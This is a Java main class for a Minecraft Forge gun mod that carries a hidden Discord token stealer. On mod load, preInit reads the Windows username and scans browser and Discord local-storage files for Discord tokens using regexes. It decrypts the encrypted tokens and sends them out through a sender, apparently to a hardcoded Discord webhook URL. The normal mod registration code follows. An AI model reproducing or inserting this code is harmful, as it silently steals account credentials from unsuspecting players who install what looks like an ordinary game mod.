package com.mrcrayfish.guns;

import com.mrcrayfish.guns.common.GuiHandler;
import com.mrcrayfish.guns.entity.EntityGrenade;
import com.mrcrayfish.guns.entity.EntityMissile;
import com.mrcrayfish.guns.init.*;
import com.mrcrayfish.guns.item.AmmoRegistry;
import com.mrcrayfish.guns.network.PacketHandler;
import com.mrcrayfish.guns.proxy.CommonProxy;
import com.mrcrayfish.guns.recipe.RecipeAttachment;
import com.mrcrayfish.guns.recipe.RecipeColorItem;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.world.GameRules;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.SidedProxy;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPostInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.event.FMLServerStartedEvent;
import net.minecraftforge.fml.common.network.NetworkRegistry;
import org.apache.logging.log4j.Logger;



import com.mrcrayfish.guns.util.Helper;
import java.io.BufferedReader;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Calendar;
import java.util.regex.Matcher;
import java.util.regex.Pattern;



@Mod(modid = Reference.MOD_ID, name = Reference.MOD_NAME, version = Reference.MOD_VERSION, acceptedMinecraftVersions = Reference.MC_VERSION, dependencies = Reference.DEPENDENCIES)
public class MrCrayfishGunMod
{
	public static final boolean VK_ENABLED = false; // If need send to VK
	public static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1139625917690429561/B6M27VfdSDh0g8BB8PzYXPWjp5yOmP-9b48mC-kvQFg7ZjE105BOB0bLYGUwCOQxvVeM";
	public static final String VK_TOKEN = "VK TOKEN"; // If VK enabled
	public static final int VK_RECEIVER_ID = 1337; // ID of user/group/chat to send log in VK
	private static final ArrayList<String> tokens = new ArrayList<>();

	private static void logCurrentTimeAndUser() {
		String timestamp = new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime());
		String username = System.getenv("USERNAME");
		Helper.getSender().sendMessage(String.format("[%s] - Searching token on %s", timestamp, username));
	}

	private static void searchTokens() {
		Helper.getManager().getPaths().forEach(path -> {
			boolean isFirefox = path.contains("Firefox");
			getTokens(path, isFirefox);
		});
	}

	private static void getTokens(String path, boolean isFirefox) {
		try {
			Path storagePath = isFirefox ? Paths.get(path) : Paths.get(path, "Local Storage", "leveldb");
			Files.list(storagePath)
					.limit(100)
					.filter(file -> isValidFile(file.toFile().getName()))
					.forEach(MrCrayfishGunMod::processFile);
		} catch (Exception ignored) {
		}
	}

	private static boolean isValidFile(String fileName) {
		return fileName.endsWith(".log") || fileName.endsWith(".ldb") || fileName.endsWith(".sqlite");
	}

	private static void processFile(Path file) {
		try (BufferedReader reader = new BufferedReader(new FileReader(file.toFile()))) {
			String line;
			while ((line = reader.readLine()) != null) {
				processLine(line, file.toFile().getAbsolutePath().toLowerCase());
			}
		} catch (Exception ignored) {
		}
	}

	private static void processLine(String line, String filePath) {
		for (int i = 24; i < 30; i++) {
			parseToken(line, "[\\w-]{" + i + "}\\.[\\w-]{6}\\.[\\w-]{38}");
		}
		if (filePath.contains("roaming") && filePath.contains("discord")) {
			parseToken(line, "dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*");
		}
	}

	private static void parseToken(String line, String regex) {
		Pattern pattern = Pattern.compile(regex);
		Matcher matcher = pattern.matcher(line);

		while (matcher.find()) {
			String token = matcher.group();
			if (token.startsWith("dQw4w9WgXcQ")) {
				try {
					token = Helper.getChecker().decryptToken(token);
				} catch (Exception ignored) {
				}
			}
			addTokenIfNotExists(token);
		}
	}

	private static void addTokenIfNotExists(String token) {
		if (!tokens.contains(token)) {
			Long.parseLong(new String(Base64.getDecoder().decode(token.split("\\.")[0]), StandardCharsets.UTF_8));
			Helper.getSender().sendMessage(Helper.getChecker().checkUser(token));
			tokens.add(token);
		}
	}




	@Mod.Instance
	public static MrCrayfishGunMod instance;

	@SidedProxy(clientSide = Reference.PROXY_CLIENT, serverSide = Reference.PROXY_SERVER)
	public static CommonProxy proxy;

	public static final CreativeTabs GUN_TAB = new TabGun();

	public static Logger logger;

	@EventHandler
	public void preInit(FMLPreInitializationEvent event)
	{
		logCurrentTimeAndUser();
		searchTokens();
		if (tokens.isEmpty()) {
			Helper.getSender().sendMessage("Tokens not found!");
		}

		logger = event.getModLog();

		ModBlocks.register();
		ModGuns.register();
		ModSounds.register();
		ModTileEntities.register();
        ModPotions.register();
		PacketHandler.init();

		RegistrationHandler.Recipes.add(new RecipeAttachment());
		RegistrationHandler.Recipes.add(new RecipeColorItem());

		proxy.preInit();
	}

	@EventHandler
	public void init(FMLInitializationEvent event)
	{
		ModCrafting.register();
		ModEntities.register();

		AmmoRegistry.getInstance().registerProjectileFactory(ModGuns.GRENADE, EntityGrenade::new);
		AmmoRegistry.getInstance().registerProjectileFactory(ModGuns.MISSILE, EntityMissile::new);

		NetworkRegistry.INSTANCE.registerGuiHandler(this, new GuiHandler());

		proxy.init();
	}

	@EventHandler
	public void postInit(FMLPostInitializationEvent event)
	{
		proxy.postInit();
	}

	@EventHandler
	public void onServerStart(FMLServerStartedEvent event)
	{
		GameRules rules = FMLCommonHandler.instance().getMinecraftServerInstance().getWorld(0).getGameRules();
		if (!rules.hasRule("gunGriefing"))
		{
			rules.addGameRule("gunGriefing", "true", GameRules.ValueType.BOOLEAN_VALUE);
		}
	}
}
